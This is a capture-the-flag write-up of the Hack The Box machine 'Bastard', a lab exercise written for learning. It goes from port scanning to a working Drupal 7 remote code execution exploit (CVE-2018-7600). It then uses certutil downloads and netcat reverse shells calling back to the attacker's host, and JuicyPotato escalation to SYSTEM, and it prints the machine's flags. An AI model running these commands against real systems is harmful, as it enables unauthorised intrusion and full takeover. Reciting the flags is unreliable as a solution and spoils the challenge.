---
date: 2024-10-11
title: Bastard HTB Write-Up
machine_ip: 10.10.10.9
os: Windows
difficulty: Medium
my_rating: 5
tags:
  - Windows
  - PrivEsc
  - rustscan
  - feroxbuster
  - IIS
  - php
  - Drupal
  - "#CVE-2018-7600"
  - JuicyPotato
  - nc
  - certutil
  - curl
  - whatweb
  - Potato
  - SimpleHTTPServer
  - SeImpersonatePrivilege
references: "[[📚CTF Box Writeups]]"
---

# Enumeration

- Ports
	- Rustscan
```
┌──(root㉿kali)-[~/Downloads]
└─# alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:alpine'     
                                                                                                                                                            
┌──(root㉿kali)-[~/Downloads]
└─# rustscan -a 10.10.10.9 -t 500 -b 500 -- -sVC -Pn                             
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.9:80
Open 10.10.10.9:135
Open 10.10.10.9:49154
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sVC -Pn" on ip 10.10.10.9
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-11 20:12 UTC
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:12
Completed NSE at 20:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:12
Completed NSE at 20:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:12
Completed NSE at 20:12, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:12
Completed Parallel DNS resolution of 1 host. at 20:12, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:12
Scanning 10.10.10.9 [3 ports]
Discovered open port 135/tcp on 10.10.10.9
Discovered open port 80/tcp on 10.10.10.9
Discovered open port 49154/tcp on 10.10.10.9
Completed Connect Scan at 20:12, 0.12s elapsed (3 total ports)
Initiating Service scan at 20:12
Scanning 3 services on 10.10.10.9
Completed Service scan at 20:13, 56.22s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.9.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:13
Completed NSE at 20:13, 22.21s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:13
Completed NSE at 20:14, 7.33s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Nmap scan report for 10.10.10.9
Host is up, received user-set (0.12s latency).
Scanned at 2024-10-11 20:12:35 UTC for 86s

PORT      STATE SERVICE REASON  VERSION
80/tcp    open  http    syn-ack Microsoft IIS httpd 7.5
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
135/tcp   open  msrpc   syn-ack Microsoft Windows RPC
49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.18 seconds
```
- Ports 80, 135, and 49154 are open

- Nmap, to check any missing ports
```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -sVC -Pn -p- 10.10.10.9  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 13:12 PDT
Nmap scan report for 10.10.10.9
Host is up (0.10s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 305.25 seconds
```
- Nmap scan on its own found the same ports and directories

- Web enumeration
	- feroxbuster #feroxbuster
```
┌──(root㉿kali)-[~/Downloads]
└─# feroxbuster -u http://10.10.10.9 -k -r --filter-status 503 403
                                                                                                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.9
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [503, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       45l      262w     1717c http://10.10.10.9/INSTALL.mysql.txt
200      GET       31l      209w     1298c http://10.10.10.9/INSTALL.sqlite.txt
200      GET       44l      290w     1874c http://10.10.10.9/INSTALL.pgsql.txt
200      GET      307l      846w     8710c http://10.10.10.9/MAINTAINERS.txt
200      GET      339l     2968w    18092c http://10.10.10.9/LICENSE.txt
200      GET      400l     2475w    17995c http://10.10.10.9/INSTALL.txt
200      GET      246l     1501w    10123c http://10.10.10.9/UPGRADE.txt
200      GET     2284l    16004w   110781c http://10.10.10.9/CHANGELOG.txt
200      GET        1l        6w       42c http://10.10.10.9/xmlrpc.php
200      GET      154l      463w     8092c http://10.10.10.9/user/register
200      GET       59l      173w     3139c http://10.10.10.9/install.php
200      GET      152l      395w     7440c http://10.10.10.9/user/login
403      GET       29l       92w     1233c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       19l       96w     6274c http://10.10.10.9/themes/bartik/logo.png
200      GET       79l      473w     2974c http://10.10.10.9/misc/jquery.once.js
200      GET        7l       35w    11296c http://10.10.10.9/misc/favicon.ico
200      GET      525l     2481w    17588c http://10.10.10.9/misc/drupal.js
200      GET      168l     1309w    78602c http://10.10.10.9/misc/jquery.js
200      GET      159l      413w     7571c http://10.10.10.9/node
200      GET      146l      368w     7090c http://10.10.10.9/user/password
200      GET      159l      413w     7571c http://10.10.10.9/
```
- We find a lot of files open to the public here, some of which are interesting and will dig into later.

- `whatweb` (and other scans) shows the webserver is running #IIS 7.5, #PHP, and #Durpal 7 as the web server configuration/http generator.
```
┌──(root㉿kali)-[~/Downloads]
└─# whatweb 10.10.10.9         
http://10.10.10.9 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]	
```

- Using `curl` on the `/CHANGELOG.txt`, we can identify the version of #Drupal 
```
┌──(root㉿kali)-[~/Downloads]
└─# curl -s http://10.10.10.9/CHANGELOG.txt | grep -m2 ""


Drupal 7.54, 2017-02-01
```

- Burpsuite, noted a few things that may be nothing
```
Cookie: has_js=1; SESSd873f26fc11f2b7e6e4aa0f6fce59913=Ch0_iCCVhDiKCHzu_SzgqCgI2fYHdgJEERoW-DHnYdg
```
# Foothold
- gain shell via exploit
- After researching for Drupal 7.54 exploits, we find #CVE-2018-7600 [this](https://github.com/pimps/CVE-2018-7600) Drupal exploit affects Drupal 7 <= 7.57
	- using the exploit below, we can run any command we want
```
┌──(root㉿kali)-[~/Downloads]
└─# python3 drupa7-CVE-2018-7600.py http://10.10.10.9/ -c whoami

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-7y_PyDJ3Pd9iVCQOAvoHVbjrppSvSkylvCo0IHOohTI
[*] Triggering exploit to execute: whoami
nt authority\iusr
```
- But this is not a shell, so we adapt.
- Maybe we need to put `nc` onto HOST so we can call it with `-c`?
	- First, we need to transfer `nc.exe` over
	- Start #SimpleHTTPServer
```
┌──(root㉿kali)-[~/Downloads]
└─# python -m SimpleHTTPServer 80         
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.9 - - [11/Oct/2024 14:29:51] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.9 - - [11/Oct/2024 14:29:52] "GET /nc.exe HTTP/1.1" 200 -
```
- Use the exploit and the `-c` to run `certutil` and grab `nc` from LHOST SimpleHTTPServer
```
┌──(root㉿kali)-[~/Downloads]
└─# python3 drupa7-CVE-2018-7600.py http://10.10.10.9/ -c "cmd.exe /c certutil.exe -urlcache -split -f http://10.10.14.2:80/nc.exe nc.exe"                 

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-hFuOc2wW_hN9HS-Na9FtVP9qQSFsParUMv5GNqSGYkk
[*] Triggering exploit to execute: cmd.exe /c certutil.exe -urlcache -split -f http://10.10.14.2:80/nc.exe nc.exe
****  Online  ****
  0000  ...
  e800
CertUtil: -URLCache command completed successfully.
```


- Now we can try to catch a shell by listening on LHOST and connecting using the `-c` command and `nc` that we just moved to RHOST
```
┌──(root㉿kali)-[~/Downloads]
└─# python3 drupa7-CVE-2018-7600.py http://10.10.10.9/ -c 'nc.exe -e cmd.exe 10.10.14.2 4444' 

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-iD4OYlytbeqkvQIyVD1WJR8NAM0Z1C7Renzpl8mxCI4
[*] Triggering exploit to execute: nc.exe -e cmd.exe 10.10.14.2 4444
```

- caught a webshell as `iusr`
```
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.9] 58508
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\iusr
```

- User flag - iusr
```
C:\Users\dimitris\Desktop>type user.txt
type user.txt
7f0724f11238ec669805bdb19bc52b75
```



# PrivEsc
- escalate to root
- Lets put #windows-exploit-suggester.py on the RHOST and run it
	- Same method above, #SimpleHTTPServer
```
┌──(root㉿kali)-[~/Downloads]
└─# python -m SimpleHTTPServer 80     
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.9 - - [11/Oct/2024 14:40:56] "GET /windows-exploit-suggester.py HTTP/1.1" 200 -
10.10.10.9 - - [11/Oct/2024 14:40:57] "GET /windows-exploit-suggester.py HTTP/1.1" 200 -
```

- Grab the #windows-exploit-suggester using #certutil 
```
┌──(root㉿kali)-[~/Downloads]
└─# python3 drupa7-CVE-2018-7600.py http://10.10.10.9/ -c "cmd.exe /c certutil.exe -urlcache -split -f http://10.10.14.2:80/windows-exploit-suggester.py wes.py"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-hWyV0Z0A9aHRpwXpawLhTBG4FO0v73QTxlNfFq37Yfk
[*] Triggering exploit to execute: cmd.exe /c certutil.exe -urlcache -split -f http://10.10.14.2:80/windows-exploit-suggester.py wes.py
****  Online  ****
  000000  ...
  010e37
CertUtil: -URLCache command completed successfully.
```


- We find privileges of #SeImpersonatePrivilege, so maybe a #Potato attack will work,
	- We transfer #JuicyPotato using same method above to RHOST
	- Attempting BITS CLSID values with no success. Tried the first CLSID in the list for [Windows Server 2008 R2 Datacenter CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise), and we successfully escalate to `NT AUTHORITY\SYSTEM`
```
C:\inetpub\drupal-7.54>JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.2 443" -t *
JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.2 443" -t *
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

- Caught escalated shell 
```
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.9] 58556
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Root flag
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
7c45730da791cd1be7577cce438a7095
```